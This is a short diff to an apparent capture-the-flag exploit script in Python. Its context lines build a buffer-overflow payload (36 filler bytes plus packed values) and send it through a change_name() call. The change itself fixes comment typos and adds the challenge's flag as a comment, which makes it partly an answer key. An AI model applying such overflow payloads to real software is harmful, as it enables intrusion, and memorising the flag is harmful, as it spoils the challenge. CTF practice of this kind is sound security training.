@@ -38,6 +38,7 @@ time.sleep(0.5)
 payload = b"A" * 36 + p32(0x11) + p32(0x0) + p32(0xa) + p32(0x539)
 change_name(payload)
 '''
-to get flag just chang gender it will triggerd display_gender() which givesthe flag
+to get flag just change gender it will trigger display_gender() which gives the flag
 '''
 p.interactive()
+#flag{take_this_flag_oh_exploitive_one}
